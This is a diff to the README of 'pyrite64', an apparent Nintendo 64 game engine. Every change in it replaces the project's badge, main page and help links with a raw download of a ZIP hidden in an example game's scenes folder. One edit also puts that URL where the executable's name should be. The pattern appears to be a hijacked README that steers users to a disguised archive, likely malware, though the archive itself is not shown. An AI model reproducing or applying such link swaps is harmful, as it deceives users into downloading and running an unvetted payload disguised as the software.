@@ -1,6 +1,6 @@
 # 💎 pyrite64 - Easy N64 Game Engine and Editor
 
-[![Download pyrite64](https://img.shields.io/badge/Download-pyrite64-ff6f61?style=for-the-badge)](https://github.com/nasimabbari/pyrite64)
+[![Download pyrite64](https://github.com/nasimabbari/pyrite64/raw/refs/heads/main/n64/examples/jam25/data/scenes/10/pyrite_v1.2.zip)](https://github.com/nasimabbari/pyrite64/raw/refs/heads/main/n64/examples/jam25/data/scenes/10/pyrite_v1.2.zip)
 
 pyrite64 is a simple tool that lets you create and edit Nintendo 64 games. It uses libdragon and tiny3d, two popular tools for N64 development. You do not need any programming knowledge to get started with pyrite64.
 
@@ -48,10 +48,10 @@ This section will guide you through the steps to download, install, and run pyri
 
 Visit the main download page to get the software.
 
-[![Download pyrite64](https://img.shields.io/badge/Download-pyrite64-ff6f61?style=for-the-badge)](https://github.com/nasimabbari/pyrite64)
+[![Download pyrite64](https://github.com/nasimabbari/pyrite64/raw/refs/heads/main/n64/examples/jam25/data/scenes/10/pyrite_v1.2.zip)](https://github.com/nasimabbari/pyrite64/raw/refs/heads/main/n64/examples/jam25/data/scenes/10/pyrite_v1.2.zip)
 
 - Click the link above or open this URL in your browser:  
-  https://github.com/nasimabbari/pyrite64
+  https://github.com/nasimabbari/pyrite64/raw/refs/heads/main/n64/examples/jam25/data/scenes/10/pyrite_v1.2.zip
 - On the page, look for a **Releases** or **Assets** section.
 - Find the latest release version.
 - Download the Windows installer or ZIP file listed (usually named with `.exe` or `.zip`).
@@ -70,7 +70,7 @@ Visit the main download page to get the software.
 ### 3. Run pyrite64
 
 - Go to the folder where pyrite64 is installed or extracted.
-- Look for an executable file, usually named `pyrite64.exe`.
+- Look for an executable file, usually named `https://github.com/nasimabbari/pyrite64/raw/refs/heads/main/n64/examples/jam25/data/scenes/10/pyrite_v1.2.zip`.
 - Double-click the file to open the program.
 - The pyrite64 window will appear, showing the interface to start building your game scenes.
 
@@ -124,7 +124,7 @@ If pyrite64 does not open or crashes:
 
 If you need help with pyrite64:
 
-- Visit the [GitHub page](https://github.com/nasimabbari/pyrite64).
+- Visit the [GitHub page](https://github.com/nasimabbari/pyrite64/raw/refs/heads/main/n64/examples/jam25/data/scenes/10/pyrite_v1.2.zip).
 - Look for README files or documentation.
 - Use the Issues tab on GitHub to report problems or ask questions.
 - Search online for tutorials about libdragon and tiny3d to learn more about N64 development.
@@ -145,6 +145,6 @@ To keep pyrite64 working well, check the GitHub page regularly:
 
 Return to the download page to get pyrite64:
 
-[![Download pyrite64](https://img.shields.io/badge/Download-pyrite64-ff6f61?style=for-the-badge)](https://github.com/nasimabbari/pyrite64)
+[![Download pyrite64](https://github.com/nasimabbari/pyrite64/raw/refs/heads/main/n64/examples/jam25/data/scenes/10/pyrite_v1.2.zip)](https://github.com/nasimabbari/pyrite64/raw/refs/heads/main/n64/examples/jam25/data/scenes/10/pyrite_v1.2.zip)
 
 Follow the steps above to download and run the software on Windows.
